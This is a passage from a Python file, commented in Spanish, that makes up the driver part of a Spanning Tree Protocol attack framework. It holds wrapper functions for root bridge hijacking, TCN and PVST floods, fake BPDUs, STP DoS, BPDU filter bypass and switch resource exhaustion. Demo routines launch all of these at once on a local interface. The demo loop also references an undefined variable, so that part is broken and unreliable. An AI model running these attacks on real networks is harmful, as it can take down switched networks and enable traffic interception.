        return attack

    def start_mstp_attack(self, region_name: str = "ATTACK", revision: int = 1,
                          instances: int = 10, rate: int = 15, duration: Optional[int] = None) -> MSTPAttack:
        """Iniciar ataque MSTP"""
        attack = self.MSTPAttack(self.iface, self.verbose)
        attack.start_mstp_flood(region_name, revision, instances, rate, duration)
        self.active_attacks['mstp'] = attack
        return attack

    def start_bpdu_filter_bypass(self, technique: str = "mac_rotation", rate: int = 10,
                                 duration: Optional[int] = None) -> BPDUFilterBypass:
        """Iniciar bypass de filtros BPDU"""
        attack = self.BPDUFilterBypass(self.iface, self.verbose)
        attack.start_filter_bypass(technique, rate, duration)
        self.active_attacks['bpdu_bypass'] = attack
        return attack

    def start_stp_reconnaissance(self, duration: int = 30) -> STPReconnaissance:
        """Iniciar reconocimiento STP"""
        attack = self.STPReconnaissance(self.iface, self.verbose)
        attack.start_reconnaissance(duration)
        self.active_attacks['recon'] = attack
        return attack

    def start_resource_exhaustion(self, attack_type: str = "memory", rate: int = 100,
                                  duration: Optional[int] = None) -> STPResourceExhaustion:
        """Iniciar agotamiento de recursos"""
        attack = self.STPResourceExhaustion(self.iface, self.verbose)
        attack.start_resource_exhaustion(attack_type, rate, duration)
        self.active_attacks['exhaustion'] = attack
        return attack

    def stop_all_attacks(self):
        """Detener todos los ataques STP activos"""
        for attack_name, attack in self.active_attacks.items():
            if hasattr(attack, 'stop_attack'):
                attack.stop_attack()
            elif hasattr(attack, 'stop_reconnaissance'):
                attack.stop_reconnaissance()
            if self.verbose:
                logging.info(f"🛑 Ataque {attack_name} detenido")

        self.active_attacks.clear()

    def get_attack_status(self) -> Dict[str, str]:
        """Obtener estado de todos los ataques"""
        status = {}
        for attack_name, attack in self.active_attacks.items():
            if hasattr(attack, 'running'):
                status[attack_name] = "running" if attack.running else "stopped"
            else:
                status[attack_name] = "unknown"
        return status

    def get_attack_statistics(self) -> Dict[str, any]:
        """Obtener estadísticas de todos los ataques"""
        stats = {
            'total_attacks': len(self.active_attacks),
            'active_attacks': 0,
            'attack_types': list(self.active_attacks.keys())
        }

        for attack in self.active_attacks.values():
            if hasattr(attack, 'running') and attack.running:
                stats['active_attacks'] += 1

        return stats


def stp_root_hijack(iface: str, priority: int = 0, root_mac: str = None,
                    count: Optional[int] = None, interval: float = 2.0,
                    verbose: bool = True) -> STPAttacks.RootHijackAttack:
    """Función de conveniencia para Root Hijack"""
    stp = STPAttacks(iface, verbose)
    return stp.start_root_hijack(priority, root_mac, count, interval)


def stp_tcn_flood(iface: str, src_mac: str = None, rate: int = 10,
                  duration: Optional[int] = None, verbose: bool = True) -> STPAttacks.TCNFloodAttack:
    """Función de conveniencia para TCN Flood"""
    stp = STPAttacks(iface, verbose)
    return stp.start_tcn_flood(src_mac, rate, duration)


def stp_fake_bpdu(iface: str, bpdu_count: int = 1000, rate: int = 50,
                  variation: bool = True, verbose: bool = True) -> STPAttacks.FakeBPDUAttack:
    """Función de conveniencia para Fake BPDU Attack"""
    stp = STPAttacks(iface, verbose)
    return stp.start_fake_bpdu_attack(bpdu_count, rate, variation)


def stp_pvst_flood(iface: str, vlan_range: range = range(1, 100), rate: int = 10,
                   duration: Optional[int] = None, verbose: bool = True) -> STPAttacks.PVSTAttack:
    """Función de conveniencia para PVST Flood"""
    stp = STPAttacks(iface, verbose)
    return stp.start_pvst_attack(vlan_range, rate, duration)


def stp_dos_attack(iface: str, attack_type: str = "maxage", rate: int = 20,
                   duration: Optional[int] = None, verbose: bool = True) -> STPAttacks.STPManipulationAttack:
    """Función de conveniencia para STP DoS Attack"""
    stp = STPAttacks(iface, verbose)
    return stp.start_stp_dos(attack_type, rate, duration)


def stp_rstp_attack(iface: str, rate: int = 20, duration: Optional[int] = None,
                    verbose: bool = True) -> STPAttacks.RSTPAttack:
    """Función de conveniencia para RSTP Attack"""
    stp = STPAttacks(iface, verbose)
    return stp.start_rstp_attack(rate, duration)


def stp_mstp_attack(iface: str, region_name: str = "ATTACK", revision: int = 1,
                    instances: int = 10, rate: int = 15, duration: Optional[int] = None,
                    verbose: bool = True) -> STPAttacks.MSTPAttack:
    """Función de conveniencia para MSTP Attack"""
    stp = STPAttacks(iface, verbose)
    return stp.start_mstp_attack(region_name, revision, instances, rate, duration)


def stp_bpdu_filter_bypass(iface: str, technique: str = "mac_rotation", rate: int = 10,
                           duration: Optional[int] = None, verbose: bool = True) -> STPAttacks.BPDUFilterBypass:
    """Función de conveniencia para BPDU Filter Bypass"""
    stp = STPAttacks(iface, verbose)
    return stp.start_bpdu_filter_bypass(technique, rate, duration)


def stp_reconnaissance(iface: str, duration: int = 30, verbose: bool = True) -> STPAttacks.STPReconnaissance:
    """Función de conveniencia para STP Reconnaissance"""
    stp = STPAttacks(iface, verbose)
    return stp.start_stp_reconnaissance(duration)


def stp_resource_exhaustion(iface: str, attack_type: str = "memory", rate: int = 100,
                            duration: Optional[int] = None, verbose: bool = True) -> STPAttacks.STPResourceExhaustion:
    """Función de conveniencia para Resource Exhaustion"""
    stp = STPAttacks(iface, verbose)
    return stp.start_resource_exhaustion(attack_type, rate, duration)


# === DEMO DIRECTA DE TODOS LOS ATAQUES STP ===

def demo_stp_attacks_direct():
    """Demo directa de todos los ataques STP sin menús interactivos"""

    print("🚀 DEMO DIRECTA - TODOS LOS ATAQUES STP")
    print("=" * 50)

    # Configuración automática de interfaz
    if platform.system() == "Darwin":
        iface = "en0"  # macOS
    else:
        iface = "eth0"  # Linux

    print(f"🔧 Usando interfaz: {iface}")
    print("⏰ Duración de ataques: 15 segundos")
    print("=" * 50)

    # Crear instancia principal
    stp = STPAttacks(iface, verbose=True)

    try:
        # 1. FASE DE RECONOCIMIENTO
        print("\n1. 🔍 INICIANDO RECONOCIMIENTO STP...")
        recon = stp.start_stp_reconnaissance(duration=10)
        sleep(12)

        bridges = recon.get_discovered_bridges()
        if bridges:
            print(f"✅ Bridges detectados: {len(bridges)}")
            for bridge in bridges:
                print(f"   - Root: {bridge['root_bridge']}")
        else:
            print("❌ No se detectaron bridges STP")

        # 2. EJECUTAR TODOS LOS ATAQUES
        print("\n2. 💥 EJECUTANDO TODOS LOS ATAQUES STP...")

        # Lista para trackear todos los ataques
        all_attacks = []

        # Ataque 1: Root Hijack
        print("👑 Iniciando Root Hijack...")
        attack1 = stp.start_root_hijack(priority=0, count=8, interval=2.0)
        all_attacks.append(("Root Hijack", attack1))
        sleep(1)

        # Ataque 2: TCN Flood
        print("🌊 Iniciando TCN Flood...")
        attack2 = stp.start_tcn_flood(rate=8, duration=15)
        all_attacks.append(("TCN Flood", attack2))
        sleep(1)

        # Ataque 3: Fake BPDU
        print("🎭 Iniciando Fake BPDU...")
        attack3 = stp.start_fake_bpdu_attack(bpdu_count=150, rate=10, variation=True)
        all_attacks.append(("Fake BPDU", attack3))
        sleep(1)

        # Ataque 4: PVST Flood
        print("🌊 Iniciando PVST Flood...")
        attack4 = stp.start_pvst_attack(vlan_range=range(1, 5), rate=6, duration=15)
        all_attacks.append(("PVST Flood", attack4))
        sleep(1)

        # Ataque 5: STP DoS
        print("💥 Iniciando STP DoS...")
        attack5 = stp.start_stp_dos(attack_type="topology", rate=8, duration=15)
        all_attacks.append(("STP DoS", attack5))
        sleep(1)

        # Ataque 6: RSTP Attack
        print("⚡ Iniciando RSTP Attack...")
        attack6 = stp.start_rstp_attack(rate=6, duration=15)
        all_attacks.append(("RSTP Attack", attack6))
        sleep(1)

        # Ataque 7: MSTP Attack
        print("🌐 Iniciando MSTP Attack...")
        attack7 = stp.start_mstp_attack(instances=3, rate=5, duration=15)
        all_attacks.append(("MSTP Attack", attack7))
        sleep(1)

        # Ataque 8: BPDU Filter Bypass
        print("🎯 Iniciando BPDU Filter Bypass...")
        attack8 = stp.start_bpdu_filter_bypass(technique="mac_rotation", rate=7, duration=15)
        all_attacks.append(("BPDU Bypass", attack8))
        sleep(1)

        # Ataque 9: Resource Exhaustion
        print("💥 Iniciando Resource Exhaustion...")
        attack9 = stp.start_resource_exhaustion(attack_type="memory", rate=12, duration=15)
        all_attacks.append(("Resource Exhaustion", attack9))

        print("\n✅ TODOS LOS ATAQUES INICIADOS!")
        print("⏳ Ejecutando por 15 segundos...")

        # 3. MONITOREO DURANTE LA EJECUCIÓN
        start_time = time.time()
        execution_time = 15

        while time.time() - start_time < execution_time:
            elapsed = int(time.time() - start_time)
            remaining = execution_time - elapsed

            # Obtener estado actual
            status = stp.get_attack_status()
            active_attacks = sum(1 for state in status.values() if state == "running")

            print(f"⏱️  Tiempo: {elapsed}s | Ataques activos: {active_acts}/{len(all_attacks)}")

            # Mostrar estado individual cada 5 segundos
            if elapsed % 5 == 0:
                for attack_name, state in status.items():
                    status_icon = "🟢" if state == "running" else "🔴"
                    print(f"   {status_icon} {attack_name}")
                print("-" * 30)

            sleep(1)

        # 4. ESTADÍSTICAS FINALES
        print("\n4. 📊 ESTADÍSTICAS FINALES DE LA DEMO")
        print("=" * 40)

        final_status = stp.get_attack_status()
        final_stats = stp.get_attack_statistics()

        print(f"🎯 Total de ataques ejecutados: {final_stats['total_attacks']}")
        print(f"🟢 Ataques completados: {sum(1 for state in final_status.values() if state == 'stopped')}")
        print(f"🔴 Ataques con errores: {sum(1 for state in final_status.values() if state == 'unknown')}")

        print("\n📋 Detalle por ataque:")
        attack_descriptions = {
            'root_hijack': '👑 Root Hijack',
            'tcn_flood': '🌊 TCN Flood',
            'fake_bpdu': '🎭 Fake BPDU',
            'pvst': '🌊 PVST Flood',
            'stp_dos': '💥 STP DoS',
            'rstp': '⚡ RSTP Attack',
            'mstp': '🌐 MSTP Attack',
            'bpdu_bypass': '🎯 BPDU Bypass',
            'exhaustion': '💥 Resource Exhaustion',
            'recon': '🔍 Reconocimiento'
        }

        for attack_type, state in final_status.items():
            status_icon = "✅" if state == "stopped" else "❌"
            desc = attack_descriptions.get(attack_type, attack_type)
            print(f"   {status_icon} {desc}: {state}")

        if bridges:
            print(f"\n🔍 Topología detectada:")
            for i, bridge in enumerate(bridges, 1):
                print(f"   {i}. {bridge['root_bridge']} (STP v{bridge['version']})")

        print(f"\n⏰ Tiempo total de demo: {int(time.time() - start_time)} segundos")

    except KeyboardInterrupt:
        print("\n🛑 Demo interrumpida por el usuario")
    except Exception as e:
        print(f"\n❌ Error durante la demo: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # LIMPIEZA FINAL
        print("\n🧹 REALIZANDO LIMPIEZA...")
        stp.stop_all_attacks()
        print("✅ Todos los ataques detenidos")
        print("🗑️  Recursos liberados")
        print("\n🎉 DEMO COMPLETADA!")


def demo_ataque_individual(attack_name: str):
    """Demo de un ataque individual específico"""

    print(f"🎯 DEMO INDIVIDUAL: {attack_name}")
    print("=" * 40)

    # Configuración automática
    if platform.system() == "Darwin":
        iface = "en0"
    else:
        iface = "eth0"

    stp = STPAttacks(iface, verbose=True)

    try:
        if attack_name.lower() == "root hijack":
            print("👑 Ejecutando Root Hijack Attack...")
            attack = stp.start_root_hijack(priority=0, count=10, interval=1.5)
            sleep(15)

        elif attack_name.lower() == "tcn flood":
            print("🌊 Ejecutando TCN Flood Attack...")
            attack = stp.start_tcn_flood(rate=10, duration=15)
            sleep(17)

        elif attack_name.lower() == "fake bpdu":
            print("🎭 Ejecutando Fake BPDU Attack...")
            attack = stp.start_fake_bpdu_attack(bpdu_count=200, rate=15, variation=True)
            sleep(15)

        elif attack_name.lower() == "pvst":
            print("🌊 Ejecutando PVST Flood Attack...")
            attack = stp.start_pvst_attack(vlan_range=range(1, 10), rate=8, duration=15)
            sleep(17)

        elif attack_name.lower() == "stp dos":
            print("💥 Ejecutando STP DoS Attack...")
            attack = stp.start_stp_dos(attack_type="topology", rate=12, duration=15)
            sleep(17)

        elif attack_name.lower() == "rstp":
            print("⚡ Ejecutando RSTP Attack...")
            attack = stp.start_rstp_attack(rate=8, duration=15)
            sleep(17)

        elif attack_name.lower() == "mstp":
            print("🌐 Ejecutando MSTP Attack...")
            attack = stp.start_mstp_attack(instances=5, rate=6, duration=15)
            sleep(17)

        elif attack_name.lower() == "bpdu bypass":
            print("🎯 Ejecutando BPDU Filter Bypass...")
            attack = stp.start_bpdu_filter_bypass(technique="mac_rotation", rate=10, duration=15)
            sleep(17)

        elif attack_name.lower() == "resource exhaustion":
            print("💥 Ejecutando Resource Exhaustion...")
            attack = stp.start_resource_exhaustion(attack_type="memory", rate=20, duration=15)
            sleep(17)

        elif attack_name.lower() == "reconnaissance":
            print("🔍 Ejecutando Reconocimiento STP...")
            attack = stp.start_stp_reconnaissance(duration=15)
            sleep(17)

            bridges = attack.get_discovered_bridges()
            if bridges:
                print(f"\n✅ Bridges encontrados: {len(bridges)}")
                for bridge in bridges:
                    print(f"   - {bridge['root_bridge']}")
            else:
                print("❌ No se encontraron bridges")

        else:
            print(f"❌ Ataque desconocido: {attack_name}")
            return

        print(f"✅ {attack_name} completado exitosamente!")

    except Exception as e:
        print(f"❌ Error en {attack_name}: {e}")
    finally:
        stp.stop_all_attacks()
        print("🧹 Limpieza completada")


# === EJECUCIÓN DIRECTA DE LAS DEMOS ===

if __name__ == "__main__":
    print("🔧 STP ATTACKS FRAMEWORK - DEMOS DIRECTAS")
    print("=" * 50)
    print("⚠️  SOLO USAR EN ENTORNOS CONTROLADOS")
    print("=" * 50)

    # Demo 1: Todos los ataques
    print("\n" + "🚀 DEMO 1: TODOS LOS ATAQUES STP".center(50))
    demo_stp_attacks_direct()

    # Pequeña pausa entre demos
    sleep(2)

    # Demo 2: Ataques individuales (ejemplos)
    print("\n" + "🎯 DEMO 2: ATAQUES INDIVIDUALES".center(50))

    # Ejecutar algunos ataques individuales
    individual_attacks = [
        "Root Hijack",
        "TCN Flood",
        "Fake BPDU",
        "Reconnaissance"
    ]

    for attack in individual_attacks:
        demo_ataque_individual(attack)
        sleep(2)  # Pausa entre ataques

    print("\n" + "🎉 TODAS LAS DEMOS COMPLETADAS".center(50))
    print("=" * 50)



